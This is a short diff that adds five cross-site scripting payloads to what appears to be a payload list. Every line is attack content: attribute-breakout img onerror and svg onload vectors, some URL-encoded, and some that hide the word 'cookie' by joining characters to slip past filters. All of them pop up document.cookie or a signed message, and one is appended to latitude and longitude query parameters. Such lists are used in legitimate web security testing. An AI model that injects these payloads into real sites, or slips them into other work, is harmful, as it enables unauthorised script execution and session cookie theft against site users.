@@ -1,0 +1,5 @@
+alert(document[['c','o','o','k','i','e'].join('')])
+"><img+src%3Dx+onerror%3D"WebAssembly%26%26alert('xss by valentino')"+class%3Dvalentino>
+"><img src=x onerror=alert(document.cookie)>
+"><svg onload="globalThis.alert(document[['c','o','o','k','i','e'].join('')])" class=valentino>
+<Svg+Only%3D1+OnLoad%3Dconfirm(document.cookie)>&lat=-8.0774722390977&long=112.2557258606
